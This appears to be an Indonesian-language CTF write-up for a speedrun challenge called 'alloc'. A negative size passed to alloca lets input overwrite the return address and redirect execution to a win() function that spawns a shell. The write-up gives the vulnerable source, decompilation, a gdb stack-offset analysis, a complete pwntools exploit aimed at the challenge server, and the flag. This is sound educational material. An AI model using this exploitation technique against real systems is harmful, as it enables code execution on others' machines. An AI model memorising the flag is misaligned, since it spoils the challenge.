# Speedrun_seccon —> alloc

## Description:

Can we use a variable for the size of a local array?

ローカル変数の配列のサイズに変数って使えるんですか？

## Problem:

Kita bisa menginputkan variabel `size` dengan nilai sesuka kita karena tidak ada penhgecekan. Dimana variabel `size` akan menjadi argumen fungsi `alloc` untuk menentukan dimana inputan akan dimasukkan ke `stack`. `buf = alloca(size)`

```c
int main() {
  int size;
  char *buf;

  /* Input size */
  printf("size: ");
  scanf("%d%*c", &size);

  /* Input data */
  printf("data: ");
  buf = alloca(size);
  readn(buf, size);

  return 0;
}
```

Tujuan akhirnya masih sama yaitu untuk memanggil fungsi `win`

```c
void win() {
  /* Call me :pleading_face: */
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
}
```

## Solution:

Lakukan decompile menggunakan ghidra, lalu kita akan mendapatkan gambaran tentang fungsi `alloc()` untuk menentukan alamat stack.

```c
uVar2 = (((long)size + 0x17U) / 0x10) * 0x10; // itung alokasi byte
...
lVar1 = -(ulong)((uint)uVar2 & 0xfff); // itung alamat stack (buffer)
```

Yang kalau disederhanain bisa jadi seperti ini

```c
buffer = rsp - (( size - 0x17 ) / 0x10 ) * 0x10)
```

Karena kita bisa menginputkan nilai `size` negatif, makan kita bisa mengatur agar `rsp` menunjuk ke alamat stack lebih tinggi (turun ke bawah) untuk kemudian dapat melakukan `overwrite return address`.

Debugging menggunakan `gdb` untuk mendapatkan nilai yang sesuai.  Kita mencoba dengan menginputkan nilai negatif kelipatan 8 yang < 0x17 (23).

```bash
gdb ./chall -q
Reading symbols from ./chall...
(No debugging symbols found in ./chall)
(gdb) init-peda
gdb-peda$ pd readn
...
0x0000000000401218 <+40>:	mov    edi,0x0
0x000000000040121d <+45>:	call   0x401090 <read@plt>  // kita bisa kasih break point disini, buat liat alamat stack yang ditulis (liat rsi)
0x0000000000401222 <+50>:	mov    rax,QWORD PTR [rbp-0x18]
0x0000000000401226 <+54>:	movzx  eax,BYTE PTR [rax]
...
gdb-peda$ br *0x000000000040121
```

Disini kita coba inputkan nilai size `-16` lalu kita lihat nilai `rsi` `0x7fffffffdde0` lalu kita coba liat jaraknya dengan `return` address. Setelah dihitung jaraknya `24 bytes`. 

```bash
gdb-peda$ tel 20
0000| 0x7fffffffddb0 --> 0xfffffff000000002 
0008| 0x7fffffffddb8 --> 0x7fffffffdde0 --> 0xfffffff0ffffdee0 
0016| 0x7fffffffddc0 --> 0x401380 (<__libc_csu_init>:	endbr64)
0024| 0x7fffffffddc8 --> 0xf7ffe190 
0032| 0x7fffffffddd0 --> 0x7fffffffddf0 --> 0x0 
0040| 0x7fffffffddd8 --> 0x401325 (<main+225>:	mov    eax,0x0)
0048| 0x7fffffffdde0 --> 0xfffffff0ffffdee0 // inputan kita masuk disini
0056| 0x7fffffffdde8 --> 0x7fffffffdde0 --> 0xfffffff0ffffdee0 
0064| 0x7fffffffddf0 --> 0x0 
0072| 0x7fffffffddf8 --> 0x7ffff7de30b3 (<__libc_start_main+243>:	mov    edi,eax) // kita perlu overwrite ini
0080| 0x7fffffffde00 --> 0x7ffff7ffc620 --> 0x5081200000000 
gdb-peda$ p/d 0x7fffffffddf8 - 0x7fffffffdde0
$1 = 24
```

Langsung kita buat exploitnya

```python
from pwn import *
LOCAL = False

if LOCAL : r = process("./chall")
else:  r = remote("133.242.227.104",9992)

elf = ELF("./chall",checksec=False)

win = p64(elf.symbols["win"])

r.sendlineafter(": ",b"-16")
r.sendlineafter(": ",win*4) // Disini karena males bikin inputan dummy bisa aja langsung kasih alamat win*4, atau bisa juga 'A'*24 + win
r.interactive()
```

## Flag:

`RTACON{alloca_w0rks_d1ff3r3ntly_fr0m_malloc_f0r_n3g4t1v3_s1z3}`